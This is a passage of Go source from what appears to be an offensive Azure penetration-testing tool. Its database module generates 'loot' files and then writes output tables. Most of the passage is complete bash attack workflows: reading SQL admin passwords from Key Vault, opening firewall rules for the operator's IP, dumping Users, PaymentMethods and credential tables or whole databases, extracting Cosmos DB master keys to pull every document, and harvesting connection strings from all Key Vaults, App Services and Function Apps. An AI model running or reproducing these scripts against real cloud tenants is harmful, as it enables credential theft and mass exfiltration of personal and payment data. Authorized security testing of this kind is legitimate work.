				"## PostgreSQL Flexible Server Database: %s/%s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# PostgreSQL Flexible Server uses automated backups\n"+
					"# Get server properties (includes earliest restore point)\n"+
					"az postgres flexible-server show \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --query \"{backupRetentionDays:backup.backupRetentionDays, geoRedundantBackup:backup.geoRedundantBackup, earliestRestoreDate:backup.earliestRestoreDate}\" \\\n"+
					"  --output table\n"+
					"\n"+
					"# Restore database to new flexible server from backup (point-in-time)\n"+
					"az postgres flexible-server restore \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s-restored \\\n"+
					"  --source-server %s \\\n"+
					"  --restore-time \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Create read replica (can be used for data exfiltration)\n"+
					"az postgres flexible-server replica create \\\n"+
					"  --replica-name %s-replica \\\n"+
					"  --resource-group %s \\\n"+
					"  --source-server %s\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"\n"+
					"# Get flexible server (includes backup info)\n"+
					"Get-AzPostgreSqlFlexibleServer -ResourceGroupName %s -Name %s | Select-Object BackupRetentionDay, GeoRedundantBackup\n"+
					"\n"+
					"# Restore flexible server\n"+
					"Restore-AzPostgreSqlFlexibleServer `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -Name %s-restored `\n"+
					"  -SourceServerResourceId /subscriptions/%s/resourceGroups/%s/providers/Microsoft.DBforPostgreSQL/flexibleServers/%s `\n"+
					"  -RestorePointInTime \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Create read replica\n"+
					"New-AzPostgreSqlFlexibleServerReplica `\n"+
					"  -Replica %s-replica `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -SourceServerResourceId /subscriptions/%s/resourceGroups/%s/providers/Microsoft.DBforPostgreSQL/flexibleServers/%s\n\n",
				db.ServerName, db.DatabaseName, db.ResourceGroup,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.ServerName, db.ResourceGroup, db.ServerName,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.SubscriptionID, db.ResourceGroup, db.ServerName,
				db.ServerName, db.ResourceGroup, db.SubscriptionID, db.ResourceGroup, db.ServerName,
			)

		case "MariaDB":
			lf.Contents += fmt.Sprintf(
				"## MariaDB Database: %s/%s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List server backups (automatic backups)\n"+
					"az mariadb server show \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --query \"{earliestRestoreDate:earliestRestoreDate, backupRetentionDays:storageProfile.backupRetentionDays}\" \\\n"+
					"  --output table\n"+
					"\n"+
					"# Restore database to new server from backup\n"+
					"az mariadb server restore \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s-restored \\\n"+
					"  --source-server %s \\\n"+
					"  --restore-point-in-time \"<YYYY-MM-DDTHH:MM:SS>\"\n"+
					"\n"+
					"# Create replica (can be used for data exfiltration)\n"+
					"az mariadb server replica create \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s-replica \\\n"+
					"  --source-server %s\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"\n"+
					"# Get server (includes backup retention info)\n"+
					"Get-AzMariaDbServer -ResourceGroupName %s -Name %s | Select-Object EarliestRestoreDate, StorageProfileBackupRetentionDay\n"+
					"\n"+
					"# Restore server\n"+
					"Restore-AzMariaDbServer `\n"+
					"  -ResourceGroupName %s `\n"+
					"  -Name %s-restored `\n"+
					"  -SourceServerName %s `\n"+
					"  -RestorePointInTime \"<YYYY-MM-DDTHH:MM:SS>\" `\n"+
					"  -UsePointInTimeRestore\n"+
					"\n"+
					"# Create replica\n"+
					"New-AzMariaDbReplica -Name %s-replica -ResourceGroupName %s -SourceServerName %s\n\n",
				db.ServerName, db.DatabaseName, db.ResourceGroup,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
				db.ResourceGroup, db.ServerName, db.ServerName,
				db.ServerName, db.ResourceGroup, db.ServerName,
			)

		case "CosmosDB":
			lf.Contents += fmt.Sprintf(
				"## CosmosDB Account: %s (Resource Group: %s)\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# List restorable database accounts (backup info)\n"+
					"az cosmosdb restorable-database-account list \\\n"+
					"  --location %s \\\n"+
					"  --output table\n"+
					"\n"+
					"# Get account properties (includes backup policy)\n"+
					"az cosmosdb show \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --query \"{backupPolicy:backupPolicy, backupStorageRedundancy:backupPolicy.backupStorageRedundancy}\" \\\n"+
					"  --output json\n"+
					"\n"+
					"# List restorable databases for this account\n"+
					"az cosmosdb sql restorable-database list \\\n"+
					"  --location %s \\\n"+
					"  --instance-id <INSTANCE-ID-FROM-ABOVE> \\\n"+
					"  --output table\n"+
					"\n"+
					"# Restore CosmosDB account from backup\n"+
					"az cosmosdb restore \\\n"+
					"  --resource-group %s \\\n"+
					"  --account-name %s-restored \\\n"+
					"  --target-database-account-name %s \\\n"+
					"  --restore-timestamp \"<YYYY-MM-DDTHH:MM:SS>\" \\\n"+
					"  --location %s\n"+
					"\n"+
					"# Create continuous backup (if not enabled)\n"+
					"az cosmosdb update \\\n"+
					"  --resource-group %s \\\n"+
					"  --name %s \\\n"+
					"  --backup-policy-type Continuous\n"+
					"\n"+
					"## PowerShell equivalents\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"\n"+
					"# Get account (includes backup info)\n"+
					"$cosmosDb = Get-AzCosmosDBAccount -ResourceGroupName %s -Name %s\n"+
					"$cosmosDb.BackupPolicy\n"+
					"\n"+
					"# Restore account (requires REST API - limited PowerShell support)\n"+
					"# Use Azure CLI for CosmosDB restore operations\n\n",
				db.ServerName, db.ResourceGroup,
				db.SubscriptionID,
				db.Region,
				db.ResourceGroup, db.ServerName,
				db.Region,
				db.ResourceGroup, db.ServerName, db.ServerName, db.Region,
				db.ResourceGroup, db.ServerName,
				db.SubscriptionID,
				db.ResourceGroup, db.ServerName,
			)
		}
	}

	// ENHANCED: Complete end-to-end database exfiltration workflows
	lf.Contents += "\n# ========================================\n"
	lf.Contents += "# ENHANCED DATABASE EXFILTRATION SCENARIOS\n"
	lf.Contents += "# ========================================\n\n"

	lf.Contents += "# SCENARIO 1: Automated SQL Database Data Extraction\n"
	lf.Contents += "# Complete workflow: Get credentials → Open firewall → Connect → Extract data → Clean up\n\n"
	lf.Contents += "#!/bin/bash\n"
	lf.Contents += "# Prerequisites: sqlcmd (install: apt-get install mssql-tools)\n\n"
	lf.Contents += "# Step 1: Get admin credentials from Key Vault (common storage location)\n"
	lf.Contents += "VAULT_NAME=\"<KEY-VAULT-NAME>\"  # Find with: az keyvault list --query '[].name'\n"
	lf.Contents += "DB_USER=$(az keyvault secret show --vault-name $VAULT_NAME --name sql-admin-user --query 'value' -o tsv 2>/dev/null)\n"
	lf.Contents += "DB_PASS=$(az keyvault secret show --vault-name $VAULT_NAME --name sql-admin-password --query 'value' -o tsv 2>/dev/null)\n\n"
	lf.Contents += "# Step 2: Get your public IP\n"
	lf.Contents += "MY_IP=$(curl -s ifconfig.me)\n"
	lf.Contents += "echo \"Your IP: $MY_IP\"\n\n"
	lf.Contents += "# Step 3: Open firewall for your IP\n"
	lf.Contents += "RG=\"<RESOURCE-GROUP>\"\n"
	lf.Contents += "SERVER=\"<SQL-SERVER-NAME>\"\n"
	lf.Contents += "DB=\"<DATABASE-NAME>\"\n"
	lf.Contents += "RULE_NAME=\"TempAccess-$(date +%s)\"\n\n"
	lf.Contents += "az sql server firewall-rule create \\\n"
	lf.Contents += "  --resource-group $RG \\\n"
	lf.Contents += "  --server $SERVER \\\n"
	lf.Contents += "  --name $RULE_NAME \\\n"
	lf.Contents += "  --start-ip-address $MY_IP \\\n"
	lf.Contents += "  --end-ip-address $MY_IP\n\n"
	lf.Contents += "sleep 5  # Wait for firewall rule to propagate\n\n"
	lf.Contents += "# Step 4: Connect and extract sensitive data\n"
	lf.Contents += "sqlcmd -S \"$SERVER.database.windows.net\" -U $DB_USER -P $DB_PASS -d $DB -Q \"\n"
	lf.Contents += "-- Extract user accounts and emails\n"
	lf.Contents += "SELECT TOP 1000 * FROM Users;\n"
	lf.Contents += "-- Extract payment information\n"
	lf.Contents += "SELECT TOP 1000 * FROM PaymentMethods;\n"
	lf.Contents += "-- Extract credentials\n"
	lf.Contents += "SELECT TOP 1000 Username, PasswordHash, Email FROM Authentication;\n"
	lf.Contents += "\" -o ./extracted_data.txt\n\n"
	lf.Contents += "# Step 5: Bulk data export to local file (full database dump)\n"
	lf.Contents += "sqlcmd -S \"$SERVER.database.windows.net\" -U $DB_USER -P $DB_PASS -d $DB -Q \"\n"
	lf.Contents += "EXEC sp_MSforeachtable @command1='SELECT * FROM ?';\n"
	lf.Contents += "\" -o ./full_dump.txt\n\n"
	lf.Contents += "# Step 6: Clean up - remove firewall rule\n"
	lf.Contents += "az sql server firewall-rule delete \\\n"
	lf.Contents += "  --resource-group $RG \\\n"
	lf.Contents += "  --server $SERVER \\\n"
	lf.Contents += "  --name $RULE_NAME\n\n"
	lf.Contents += "echo \"Data extracted to ./extracted_data.txt and ./full_dump.txt\"\n\n"

	lf.Contents += "# SCENARIO 2: PostgreSQL/MySQL Data Exfiltration\n"
	lf.Contents += "# Similar workflow for PostgreSQL/MySQL databases\n\n"
	lf.Contents += "#!/bin/bash\n"
	lf.Contents += "# Prerequisites: psql (PostgreSQL) or mysql client\n\n"
	lf.Contents += "# Get credentials (example: from App Service environment variables)\n"
	lf.Contents += "WEBAPP=\"<WEBAPP-NAME>\"\n"
	lf.Contents += "WEBAPP_RG=\"<WEBAPP-RESOURCE-GROUP>\"\n"
	lf.Contents += "CONNECTION_STRING=$(az webapp config connection-string list \\\n"
	lf.Contents += "  --name $WEBAPP \\\n"
	lf.Contents += "  --resource-group $WEBAPP_RG \\\n"
	lf.Contents += "  --query \"[?name=='DefaultConnection'].value\" -o tsv)\n\n"
	lf.Contents += "# Parse connection string to extract credentials\n"
	lf.Contents += "# Format: Server=<host>;Database=<db>;User Id=<user>;Password=<pass>\n"
	lf.Contents += "PG_HOST=$(echo $CONNECTION_STRING | grep -oP 'Server=\\K[^;]+')\n"
	lf.Contents += "PG_DB=$(echo $CONNECTION_STRING | grep -oP 'Database=\\K[^;]+')\n"
	lf.Contents += "PG_USER=$(echo $CONNECTION_STRING | grep -oP 'User Id=\\K[^;]+')\n"
	lf.Contents += "PG_PASS=$(echo $CONNECTION_STRING | grep -oP 'Password=\\K[^;]+')\n\n"
	lf.Contents += "# Open firewall\n"
	lf.Contents += "MY_IP=$(curl -s ifconfig.me)\n"
	lf.Contents += "SERVER_NAME=$(echo $PG_HOST | cut -d'.' -f1)\n"
	lf.Contents += "PG_RG=\"<POSTGRES-RESOURCE-GROUP>\"\n\n"
	lf.Contents += "az postgres server firewall-rule create \\\n"
	lf.Contents += "  --resource-group $PG_RG \\\n"
	lf.Contents += "  --server-name $SERVER_NAME \\\n"
	lf.Contents += "  --name TempAccess \\\n"
	lf.Contents += "  --start-ip-address $MY_IP \\\n"
	lf.Contents += "  --end-ip-address $MY_IP\n\n"
	lf.Contents += "sleep 5\n\n"
	lf.Contents += "# Connect and dump data (PostgreSQL example)\n"
	lf.Contents += "PGPASSWORD=$PG_PASS psql -h $PG_HOST -U $PG_USER -d $PG_DB -c \"\n"
	lf.Contents += "-- Enumerate all tables\n"
	lf.Contents += "\\dt\n"
	lf.Contents += "-- Extract sensitive data\n"
	lf.Contents += "SELECT * FROM users LIMIT 1000;\n"
	lf.Contents += "SELECT * FROM credentials LIMIT 1000;\n"
	lf.Contents += "\" > ./pg_extracted.txt\n\n"
	lf.Contents += "# Full database dump\n"
	lf.Contents += "PGPASSWORD=$PG_PASS pg_dump -h $PG_HOST -U $PG_USER -d $PG_DB -f ./full_db_dump.sql\n\n"
	lf.Contents += "# Clean up firewall rule\n"
	lf.Contents += "az postgres server firewall-rule delete \\\n"
	lf.Contents += "  --resource-group $PG_RG \\\n"
	lf.Contents += "  --server-name $SERVER_NAME \\\n"
	lf.Contents += "  --name TempAccess\n\n"

	lf.Contents += "# SCENARIO 3: CosmosDB Data Extraction via REST API\n"
	lf.Contents += "# CosmosDB uses REST API with keys (no firewall needed if keys available)\n\n"
	lf.Contents += "#!/bin/bash\n"
	lf.Contents += "COSMOS_ACCOUNT=\"<COSMOS-ACCOUNT-NAME>\"\n"
	lf.Contents += "COSMOS_RG=\"<RESOURCE-GROUP>\"\n\n"
	lf.Contents += "# Get primary key\n"
	lf.Contents += "PRIMARY_KEY=$(az cosmosdb keys list \\\n"
	lf.Contents += "  --resource-group $COSMOS_RG \\\n"
	lf.Contents += "  --name $COSMOS_ACCOUNT \\\n"
	lf.Contents += "  --type keys \\\n"
	lf.Contents += "  --query 'primaryMasterKey' -o tsv)\n\n"
	lf.Contents += "# List databases\n"
	lf.Contents += "curl -X GET \\\n"
	lf.Contents += "  \"https://$COSMOS_ACCOUNT.documents.azure.com/dbs\" \\\n"
	lf.Contents += "  -H \"Authorization: $PRIMARY_KEY\" \\\n"
	lf.Contents += "  -H \"x-ms-date: $(date -u +'%a, %d %b %Y %T GMT')\" \\\n"
	lf.Contents += "  -H \"x-ms-version: 2018-12-31\"\n\n"
	lf.Contents += "# Query documents (example with database and collection)\n"
	lf.Contents += "DATABASE_ID=\"<DATABASE-ID>\"\n"
	lf.Contents += "COLLECTION_ID=\"<COLLECTION-ID>\"\n\n"
	lf.Contents += "curl -X POST \\\n"
	lf.Contents += "  \"https://$COSMOS_ACCOUNT.documents.azure.com/dbs/$DATABASE_ID/colls/$COLLECTION_ID/docs\" \\\n"
	lf.Contents += "  -H \"Authorization: $PRIMARY_KEY\" \\\n"
	lf.Contents += "  -H \"Content-Type: application/query+json\" \\\n"
	lf.Contents += "  -H \"x-ms-documentdb-isquery: True\" \\\n"
	lf.Contents += "  -H \"x-ms-date: $(date -u +'%a, %d %b %Y %T GMT')\" \\\n"
	lf.Contents += "  -H \"x-ms-version: 2018-12-31\" \\\n"
	lf.Contents += "  -d '{\"query\": \"SELECT * FROM c\"}' > ./cosmos_data.json\n\n"
	lf.Contents += "# Alternative: Use Azure CLI to export data\n"
	lf.Contents += "az cosmosdb sql container list \\\n"
	lf.Contents += "  --account-name $COSMOS_ACCOUNT \\\n"
	lf.Contents += "  --resource-group $COSMOS_RG \\\n"
	lf.Contents += "  --database-name $DATABASE_ID\n\n"

	lf.Contents += "# SCENARIO 4: Extract Credentials from Multiple Sources\n"
	lf.Contents += "# Automated credential harvesting from Key Vaults, App Services, Function Apps\n\n"
	lf.Contents += "#!/bin/bash\n"
	lf.Contents += "mkdir -p ./harvested_credentials\n\n"
	lf.Contents += "# Extract from all Key Vaults\n"
	lf.Contents += "echo \"=== Key Vault Secrets ===\"\n"
	lf.Contents += "for VAULT in $(az keyvault list --query '[].name' -o tsv); do\n"
	lf.Contents += "  echo \"Vault: $VAULT\"\n"
	lf.Contents += "  for SECRET in $(az keyvault secret list --vault-name $VAULT --query '[].name' -o tsv 2>/dev/null); do\n"
	lf.Contents += "    # Look for database-related secrets\n"
	lf.Contents += "    if echo $SECRET | grep -iE '(sql|db|database|postgres|mysql|connection)'; then\n"
	lf.Contents += "      VALUE=$(az keyvault secret show --vault-name $VAULT --name $SECRET --query 'value' -o tsv 2>/dev/null)\n"
	lf.Contents += "      echo \"$VAULT/$SECRET: $VALUE\" >> ./harvested_credentials/keyvault_db_secrets.txt\n"
	lf.Contents += "    fi\n"
	lf.Contents += "  done\n"
	lf.Contents += "done\n\n"
	lf.Contents += "# Extract from all App Services\n"
	lf.Contents += "echo \"=== App Service Connection Strings ===\"\n"
	lf.Contents += "for WEBAPP in $(az webapp list --query '[].name' -o tsv); do\n"
	lf.Contents += "  RG=$(az webapp show --name $WEBAPP --query 'resourceGroup' -o tsv)\n"
	lf.Contents += "  echo \"WebApp: $WEBAPP\"\n"
	lf.Contents += "  az webapp config connection-string list \\\n"
	lf.Contents += "    --name $WEBAPP \\\n"
	lf.Contents += "    --resource-group $RG \\\n"
	lf.Contents += "    -o json >> ./harvested_credentials/webapp_connections.json\n"
	lf.Contents += "done\n\n"
	lf.Contents += "# Extract from Function Apps\n"
	lf.Contents += "echo \"=== Function App Settings ===\"\n"
	lf.Contents += "for FUNCAPP in $(az functionapp list --query '[].name' -o tsv); do\n"
	lf.Contents += "  RG=$(az functionapp show --name $FUNCAPP --query 'resourceGroup' -o tsv)\n"
	lf.Contents += "  echo \"FunctionApp: $FUNCAPP\"\n"
	lf.Contents += "  az functionapp config appsettings list \\\n"
	lf.Contents += "    --name $FUNCAPP \\\n"
	lf.Contents += "    --resource-group $RG \\\n"
	lf.Contents += "    -o json | grep -iE '(connection|database|sql)' >> ./harvested_credentials/functionapp_settings.json\n"
	lf.Contents += "done\n\n"
	lf.Contents += "echo \"Credentials harvested to ./harvested_credentials/\"\n\n"
}

// ------------------------------
// Write output (AWS-style writeLoot pattern)
// ------------------------------
func (m *DatabasesModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if len(m.DatabaseRows) == 0 {
		logger.InfoM("No databases found", globals.AZ_DATABASES_MODULE_NAME)
		return
	}

	// Build headers
	headers := []string{
		"Tenant Name", // NEW: for multi-tenant support
		"Tenant ID",   // NEW: for multi-tenant support
		"Subscription ID",
		"Subscription Name",
		"Resource Group",
		"Region",
		"Database Server",
		"Database Name",
		"DB Type",
		"SKU/Tier",
		"Tags",
		"Private IPs",
		"Public IPs",
		"Admin Username",
		"EntraID Centralized Auth",
		"Public?",
		"Encryption/TDE",
		"Customer Managed Key",
		"Min TLS Version",
		"Dynamic Data Masking",
		"ATP/Defender for SQL",     // NEW: Advanced Threat Protection / Microsoft Defender
		"Auditing Enabled",         // NEW: SQL Auditing status
		"Auditing Retention",       // NEW: Audit log retention period
		"Vulnerability Assessment", // NEW: VA configuration status
		"System Assigned Identity ID",
		"User Assigned Identity ID",
	}

	// Check if we should split output by tenant (multi-tenant mode)
	if azinternal.ShouldSplitByTenant(m.IsMultiTenant, m.Tenants) {
		// Split into separate tenant directories
		if err := m.FilterAndWritePerTenantAuto(
			ctx,
			logger,
			m.Tenants,
			m.DatabaseRows,
			headers,
			"databases",
			globals.AZ_DATABASES_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Check if we should split output by subscription (multiple subs WITHOUT --tenant flag, single tenant)
	if azinternal.ShouldSplitBySubscription(m.Subscriptions, m.TenantFlagPresent) {
		if err := m.FilterAndWritePerSubscriptionAuto(
			ctx, logger, m.Subscriptions, m.DatabaseRows, headers,
			"databases", globals.AZ_DATABASES_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Build loot array
	loot := []internal.LootFile{}
	for _, lf := range m.LootMap {
		if lf.Contents != "" {
			loot = append(loot, *lf)
		}
	}

	// Create output
	output := DatabasesOutput{
		Table: []internal.TableFile{{
			Name:   "databases",
			Header: headers,
			Body:   m.DatabaseRows,
		}},
		Loot: loot,
	}

	// Determine output scope (single subscription vs tenant-wide consolidation)
	scopeType, scopeIDs, scopeNames := azinternal.DetermineScopeForOutput(m.Subscriptions, m.TenantID, m.TenantName, m.TenantFlagPresent)
	scopeNames = azinternal.GetSubscriptionNamesForOutput(ctx, m.Session, scopeType, scopeIDs)

	// Write output using HandleOutputSmart (automatic streaming for large datasets)
	if err := internal.HandleOutputSmart(
		"Azure",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIDs,
		scopeNames,
		m.UserUPN,
		output,
	); err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.AZ_DATABASES_MODULE_NAME)
		m.CommandCounter.Error++
	}

	logger.SuccessM(fmt.Sprintf("Found %d database(s) across %d subscription(s)", len(m.DatabaseRows), len(m.Subscriptions)), globals.AZ_DATABASES_MODULE_NAME)
}
